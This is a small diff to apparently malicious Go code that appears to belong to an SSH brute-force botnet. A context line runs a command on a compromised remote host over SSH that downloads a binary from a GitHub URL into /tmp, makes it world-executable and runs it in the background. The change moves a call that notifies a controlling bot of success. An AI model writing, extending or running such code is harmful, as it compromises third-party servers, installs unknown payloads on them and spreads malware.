@@ -212,6 +212,10 @@ func fun(ip string) {
 er := session.Run("curl -L  https://github.com/atilabyte/golang/raw/refs/heads/master/atila -o /tmp/atila ; chmod 777 /tmp/atila ; /tmp/./atila  & ")
 
 
+              go bot()
+
+
+
 			fmt.Println(er)
 
 			session.Close()
@@ -270,7 +274,6 @@ for {
 time.Sleep (10 * time.Second)
 
 
-go  bot( "vkzmn  brute force ssh ok"  ) //notify bot  brute force ok
 
 
 }
